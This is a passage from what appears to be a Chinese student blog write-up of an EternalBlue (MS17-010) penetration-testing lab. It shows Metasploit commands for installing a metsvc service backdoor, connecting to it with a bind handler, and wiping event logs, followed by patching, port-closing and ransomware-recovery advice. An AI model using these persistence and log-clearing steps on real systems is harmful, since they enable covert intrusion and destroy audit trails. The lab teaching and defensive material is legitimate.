+<h3 id="metsvc服务后门"><a href="#metsvc服务后门" class="headerlink" title="metsvc服务后门"></a>metsvc服务后门</h3><blockquote>
+<p>在C:\Users***\AppData\Local\Temp\上传了三个文件（metsrv.x86.dll、metsvc-server.exe、metsvc.exe），通过服务启动，服务名为meterpreter</p>
+</blockquote>
+<ul>
+<li>run metsvc –h   # 查看帮助</li>
+<li>run metsvc –A   #自动安装后门</li>
+</ul>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639374688570.png" alt="服务后门"></p>
+<ul>
+<li>msf &gt; use exploit/multi/handler</li>
+<li>msf &gt; set payload windows/metsvc_bind_tcp</li>
+<li>msf &gt; set RHOST 192.168.159.144</li>
+<li>msf &gt; set RPORT 31337</li>
+<li>msf &gt; exploit</li>
+</ul>
+<h2 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h2><blockquote>
+<p><code>run event_manager -c</code>    #清除目标系统的事件日志</p>
+</blockquote>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639375334920.png" alt="痕迹清理"></p>
+<h1 id="报告阶段"><a href="#报告阶段" class="headerlink" title="报告阶段"></a>报告阶段</h1><p>报告是渗透测试过程中最为重要的因素，使用报告文档来交流在渗透测试过程中做了哪些，如何做的，以及最为重要的—-客户组织如何修复所发现的安全漏洞和弱点。</p>
+<p>永恒之蓝漏洞的修复与防范：</p>
+<h2 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h2><ol>
+<li><p>为计算机安装最新的安全补丁，微软已发布补丁MS17-010修复了“永恒之蓝”攻击的系统漏洞，请尽快安装此安全补丁，网址为Microsoft 安全公告 MS17-010 - 严重 | Microsoft Docs。</p>
+</li>
+<li><p> 及时备份，一定要离线备份重要文件</p>
+</li>
+<li><p>开启防火墙</p>
+</li>
+<li><p>关闭445、135、137、138、139端口，关闭网络共享。</p>
+</li>
+</ol>
+<h4 id="关闭445端口"><a href="#关闭445端口" class="headerlink" title="关闭445端口"></a>关闭445端口</h4><blockquote>
+<p>445端口：在局域网中轻松访问各种共享文件夹或共享打印机
+　　</p>
+</blockquote>
+<ol>
+<li>WIN+R 运行–regedit</li>
+<li>找到注册表项“HKEY_LOCAL_MACHINE\System\Controlset\Services\NetBT\Parameters”           </li>
+<li>选择“Parameters”项，右键单击，选择“新建”——“DWORD值”。(64位  32位根据自己需求)</li>
+<li>将DWORD值重命名为“SMBDeviceEnabled”</li>
+<li>修改”数值数据”的值为0,点击确定，完成设置</li>
+</ol>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639376468455.png" alt="关闭445"></p>
+<h4 id="关闭135端口"><a href="#关闭135端口" class="headerlink" title="关闭135端口"></a>关闭135端口</h4><blockquote>
+<p>135端口：Microsoft在这个端口运行DCE RPC end-point mapper为它的DCOM服务。这与UNIX 111端口的功能很相似。使用DCOM和RPC的服务利用计算机上的end-point mapper注册它们的位置。远端客户连接到计算机时，它们查找end-point mapper找到服务的位置。</p>
+</blockquote>
+<ol>
+<li>WIN+R 运行–dcomcnfg</li>
+<li>在弹出的“组件服务”对话框中，选择“计算机”选项。</li>
+<li>右键单击”我的电脑”，选择”属性” </li>
+<li>在”默认属性”选项卡中，去掉”在此计算机上启用分布式COM”前的勾。</li>
+<li>选择”默认协议”选项卡，选中”面向连接的TCP/IP”，单击”移除”按钮。</li>
+</ol>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639376646107.png" alt="关闭135"></p>
+<p>　</p>
+<h4 id="关闭137、138、139端口"><a href="#关闭137、138、139端口" class="headerlink" title="关闭137、138、139端口"></a>关闭137、138、139端口</h4><blockquote>
+<p>137、138端口：137、138是UDP端口，当通过网上邻居传输文件时用这个端口。而139端口：通过这个端口进入的连接试图获得NetBIOS/SMB服务</p>
+</blockquote>
+<ol>
+<li>打开网络共享中心 – 更改适配器设置</li>
+<li>右键点击属性，把框起来的选项前面的勾去掉，然后卸载</li>
+</ol>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639376806506.png" alt="1"></p>
+<ol start="3">
+<li>双击Internet 协议版本 4 (TCP/IPv4)– 高级–选择WIN</li>
+<li>勾选禁用TCP/IP上的NetBIOS(S)<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639376885411.png" alt="2"></li>
+</ol>
+<p>做完以上操作 重启即可关闭端口</p>
+<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>如果中招 已经被勒索，建议360网址下载查杀工具：<a target="_blank" rel="noopener" href="http://dl.360safe.com/nsa/nsatool.exe">http://dl.360safe.com/nsa/nsatool.exe</a></p>
+<p>到卡巴斯基下载文件解锁工具：<a target="_blank" rel="noopener" href="https://noransom.kaspersky.com/">https://noransom.kaspersky.com/</a></p>
+<ol>
+<li>打开自己的那个勒索软件界面，点击copy. （复制黑客的比特币地址）</li>
+<li>把copy粘贴到btc.com （区块链查询器）</li>
+<li>在区块链查询器中找到黑客收款地址的交易记录，然后随意选择一txid（交易哈希值）</li>
+<li>把txid 复制粘贴给 勒索软件界面按钮connect us.</li>
+<li>等黑客看到后 你再点击勒索软件上的check payment.</li>
+<li>再点击decrypt 解密文件即可。</li>
+<li>解锁软件：<a target="_blank" rel="noopener" href="https://github.com/QuantumLiu/antiBTCHack">https://github.com/QuantumLiu/antiBTCHack</a></li>
+<li>实际上并不是物理解密文件</li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Qidangge</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://qidangge.github.io/2021/12/13/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88%E6%B5%81%E7%A8%8B%E6%A8%A1%E6%8B%9F%EF%BC%89/">https://qidangge.github.io/2021/12/13/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88%E6%B5%81%E7%A8%8B%E6%A8%A1%E6%8B%9F%EF%BC%89/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://qidangge.github.io" target="_blank">Qidangge的小小世界</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/metasploit/">metasploit</a><a class="post-meta__tags" href="/tags/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E/">永恒之蓝漏洞</a></div><div class="post_share"><div class="social-share" data-image="https://gitee.com/qidangge/picgo/raw/master/img/202110151706732.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/12/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E7%BC%96%E8%AF%91%E4%B8%8E%E9%93%BE%E6%8E%A5/"><img class="prev-cover" src="https://gitee.com/qidangge/picgo/raw/master/img/202110151650474.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">第二章 编译与链接</div></div></a></div><div class="next-post pull-right"><a href="/2021/12/03/%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0--%E7%BD%91%E7%BB%9C%E5%B1%82%E7%9A%84%E5%8D%8F%E8%AE%AE/"><img class="next-cover" src="https://gitee.com/qidangge/picgo/raw/master/img/202110151650474.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">计网学习--网络层的协议</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/11/22/%E4%BD%9C%E4%B8%9A6.1%20Metasploit%E6%93%8D%E4%BD%9C/" title="作业6.1 Metasploit  ms12 -020漏洞利用"><img class="cover" src="https://gitee.com/qidangge/picgo/raw/master/img/202110151650471.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-22</div><div class="title">作业6.1 Metasploit  ms12 -020漏洞利用</div></div></a></div><div><a href="/2021/10/24/%E4%BD%9C%E4%B8%9A2.2%20ping%E6%93%8D%E4%BD%9C%E4%B8%8Eicmp/" title="作业2.2 ping与wireshark"><img class="cover" src="https://gitee.com/qidangge/picgo/raw/master/img/202110151650471.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-24</div><div class="title">作业2.2 ping与wireshark</div></div></a></div><div><a href="/2021/10/22/%E4%BD%9C%E4%B8%9A3.1%20TCP%E7%9B%B8%E5%85%B3/" title="作业3.1 TCP/IP 协议相关"><img class="cover" src="https://gitee.com/qidangge/picgo/raw/master/img/202110151650471.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-22</div><div class="title">作业3.1 TCP/IP 协议相关</div></div></a></div><div><a href="/2021/10/16/%E4%BD%9C%E4%B8%9A2.1%20%E4%B8%8A%E8%AF%BE%E5%AD%A6%E4%B9%A0--%E8%AE%A1%E7%BD%91%E7%9B%B8%E5%85%B3/" title="作业2.1 上课学习--计网相关"><img class="cover" src="https://gitee.com/qidangge/picgo/raw/master/img/202110151650472.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-16</div><div class="title">作业2.1 上课学习--计网相关</div></div></a></div><div><a href="/2021/10/23/%E4%BD%9C%E4%B8%9A3.2%20%E4%B8%BB%E5%8A%A8%E4%B8%8E%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F/" title="作业3.2 主动与被动扫描"><img class="cover" src="https://gitee.com/qidangge/picgo/raw/master/img/202110151650477.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-23</div><div class="title">作业3.2 主动与被动扫描</div></div></a></div><div><a href="/2021/11/15/%E4%BD%9C%E4%B8%9A5.1%20%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" title="作业5.1 一句话木马"><img class="cover" src="https://gitee.com/qidangge/picgo/raw/master/img/202110151650474.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-15</div><div class="title">作业5.1 一句话木马</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/./img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Qidangge</div><div class="author-info__description">欢迎来访</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">31</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">43</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">25</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Qidangge"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Qidangge" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:xxxxxx@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">记录生活与收获！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%83%85%E6%8A%A5%E6%90%9C%E9%9B%86%E9%98%B6%E6%AE%B5"><span class="toc-number">1.</span> <span class="toc-text">情报搜集阶段</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%9C%AC%E6%9C%BAip"><span class="toc-number">1.0.1.</span> <span class="toc-text">查看本机ip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E6%89%AB%E6%8F%8F%E5%AD%90%E7%BD%91"><span class="toc-number">1.0.2.</span> <span class="toc-text">nmap扫描子网</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C%EF%BC%8C%E5%B9%B6%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90"><span class="toc-number">1.0.3.</span> <span class="toc-text">查看扫描结果，并进行分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1%E9%98%B6%E6%AE%B5"><span class="toc-number">2.</span> <span class="toc-text">威胁建模阶段</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E9%98%B6%E6%AE%B5"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析阶段</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E5%85%A5MSF%E6%A1%86%E6%9E%B6"><span class="toc-number">3.0.1.</span> <span class="toc-text">进入MSF框架</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E6%A8%A1%E5%9D%97"><span class="toc-number">3.0.2.</span> <span class="toc-text">查找漏洞相关模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%89%AB%E6%8F%8F%E6%A8%A1%E5%9D%97"><span class="toc-number">3.0.3.</span> <span class="toc-text">利用扫描模块</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E9%98%B6%E6%AE%B5"><span class="toc-number">4.</span> <span class="toc-text">漏洞攻击阶段</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%8F%82%E6%95%B0"><span class="toc-number">4.0.1.</span> <span class="toc-text">查看参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BE%E5%AE%9A%E5%8F%82%E6%95%B0"><span class="toc-number">4.0.2.</span> <span class="toc-text">设定参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AEpayload"><span class="toc-number">4.0.3.</span> <span class="toc-text">设置payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#run-gt-%E8%8E%B7%E5%BE%97%E6%9D%83%E9%99%90"><span class="toc-number">4.0.4.</span> <span class="toc-text">run-&gt;获得权限</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E9%98%B6%E6%AE%B5"><span class="toc-number">5.</span> <span class="toc-text">后渗透攻击阶段</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#meterpreter%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">5.1.</span> <span class="toc-text">meterpreter的基本系统命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">5.2.</span> <span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#getsystem%E6%8F%90%E6%9D%83"><span class="toc-number">5.2.1.</span> <span class="toc-text">getsystem提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bypassuac"><span class="toc-number">5.2.2.</span> <span class="toc-text">bypassuac</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E9%AB%98%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E7%BA%A7%E5%88%AB"><span class="toc-number">5.2.3.</span> <span class="toc-text">提高程序运行级别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8windows%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83"><span class="toc-number">5.2.4.</span> <span class="toc-text">利用windows提权漏洞进行提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A4%E7%89%8C%E6%93%8D%E7%BA%B5"><span class="toc-number">5.2.5.</span> <span class="toc-text">令牌操纵</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E7%BB%AD%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C"><span class="toc-number">5.3.</span> <span class="toc-text">后续提权操作</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">5.3.1.</span> <span class="toc-text">基本信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hash%E4%B8%8E%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%AF%BB%E5%8F%96"><span class="toc-number">5.3.2.</span> <span class="toc-text">hash与明文密码读取</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">5.4.</span> <span class="toc-text">文件系统命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">5.5.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5"><span class="toc-number">5.6.</span> <span class="toc-text">后门植入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%A4%8D%E5%85%A5"><span class="toc-number">5.6.1.</span> <span class="toc-text">启动项植入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#metsvc%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8"><span class="toc-number">5.6.2.</span> <span class="toc-text">metsvc服务后门</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86"><span class="toc-number">5.7.</span> <span class="toc-text">痕迹清理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%A5%E5%91%8A%E9%98%B6%E6%AE%B5"><span class="toc-number">6.</span> <span class="toc-text">报告阶段</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%84%E9%98%B2"><span class="toc-number">6.1.</span> <span class="toc-text">预防</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E9%97%AD445%E7%AB%AF%E5%8F%A3"><span class="toc-number">6.1.0.1.</span> <span class="toc-text">关闭445端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E9%97%AD135%E7%AB%AF%E5%8F%A3"><span class="toc-number">6.1.0.2.</span> <span class="toc-text">关闭135端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E9%97%AD137%E3%80%81138%E3%80%81139%E7%AB%AF%E5%8F%A3"><span class="toc-number">6.1.0.3.</span> <span class="toc-text">关闭137、138、139端口</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-number">6.2.</span> <span class="toc-text">修复</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/03/13/python%E5%AE%9E%E8%B7%B51--%E7%B4%A0%E6%80%A7%E6%A3%80%E9%AA%8C%E7%AE%97%E6%B3%95%EF%BC%88%E4%B8%89%E7%A7%8D%EF%BC%89/" title="python实践1--素性检验算法（三种）"><img src="https://gitee.com/qidangge/picgo/raw/master/img/202110151706732.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="python实践1--素性检验算法（三种）"/></a><div class="content"><a class="title" href="/2022/03/13/python%E5%AE%9E%E8%B7%B51--%E7%B4%A0%E6%80%A7%E6%A3%80%E9%AA%8C%E7%AE%97%E6%B3%95%EF%BC%88%E4%B8%89%E7%A7%8D%EF%BC%89/" title="python实践1--素性检验算法（三种）">python实践1--素性检验算法（三种）</a><time datetime="2022-03-13T08:51:08.160Z" title="发表于 2022-03-13 16:51:08">2022-03-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%BE%E7%A8%8B--ch2%20%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93/" title="数据库课程--ch2 关系数据库"><img src="https://gitee.com/qidangge/picgo/raw/master/img/202110151706732.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="数据库课程--ch2 关系数据库"/></a><div class="content"><a class="title" href="/2022/03/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%BE%E7%A8%8B--ch2%20%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93/" title="数据库课程--ch2 关系数据库">数据库课程--ch2 关系数据库</a><time datetime="2022-03-03T03:27:48.139Z" title="发表于 2022-03-03 11:27:48">2022-03-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/02/28/Python%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0-ch4%20%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/" title="Python课程学习-ch4 流程控制"><img src="https://gitee.com/qidangge/picgo/raw/master/img/202110151650474.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Python课程学习-ch4 流程控制"/></a><div class="content"><a class="title" href="/2022/02/28/Python%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0-ch4%20%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/" title="Python课程学习-ch4 流程控制">Python课程学习-ch4 流程控制</a><time datetime="2022-02-28T06:11:02.173Z" title="发表于 2022-02-28 14:11:02">2022-02-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/02/23/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%BE%E7%A8%8B--%E7%BB%AA%E8%AE%BA/" title="数据库课程--绪论（涵盖后续所有内容）"><img src="https://gitee.com/qidangge/picgo/raw/master/img/202110151650471.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="数据库课程--绪论（涵盖后续所有内容）"/></a><div class="content"><a class="title" href="/2022/02/23/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%BE%E7%A8%8B--%E7%BB%AA%E8%AE%BA/" title="数据库课程--绪论（涵盖后续所有内容）">数据库课程--绪论（涵盖后续所有内容）</a><time datetime="2022-02-23T11:31:34.771Z" title="发表于 2022-02-23 19:31:34">2022-02-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/02/13/Python%E5%AD%A6%E4%B9%A0--%E6%A8%A1%E5%9D%97%E6%89%A9%E5%B1%95/" title="Python课程学习--模块扩展"><img src="https://gitee.com/qidangge/picgo/raw/master/img/202110151706731.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Python课程学习--模块扩展"/></a><div class="content"><a class="title" href="/2022/02/13/Python%E5%AD%A6%E4%B9%A0--%E6%A8%A1%E5%9D%97%E6%89%A9%E5%B1%95/" title="Python课程学习--模块扩展">Python课程学习--模块扩展</a><time datetime="2022-02-13T10:17:27.926Z" title="发表于 2022-02-13 18:17:27">2022-02-13</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://gitee.com/qidangge/picgo/raw/master/img/202110151706732.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Qidangge</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">与人同行，相约共进</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="来了,就,不要,走了,！" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
